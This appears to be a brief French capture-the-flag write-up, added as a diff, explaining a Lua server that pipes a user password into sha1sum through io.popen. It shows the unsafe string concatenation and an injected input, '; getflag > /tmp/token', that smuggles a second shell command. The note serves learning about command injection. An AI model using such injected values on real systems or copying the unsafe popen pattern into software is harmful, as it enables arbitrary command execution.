@@ -1,0 +1,19 @@
+On a un serveur qui prend a la connexion un mdp
+et qui le hash avec sha1sum puis verifie si il 
+est correct.
+
+Doit pouvoir etre crack avec jhonTheRipper?
+
+Mais plus simple, le script comporte une faille.
+io.popen("echo "..pass.." | sha1sum", "r")
+
+..pass.. concatene le tout
+donc par exemple avec test en input:
+
+echo test | sla1sum
+
+mais du coup avec en input:
+; getflag > /tmp/token
+
+cela donne echo test; getflag > /tmp/token | sha1sum
+on peut donc injecter ce que l'on veut
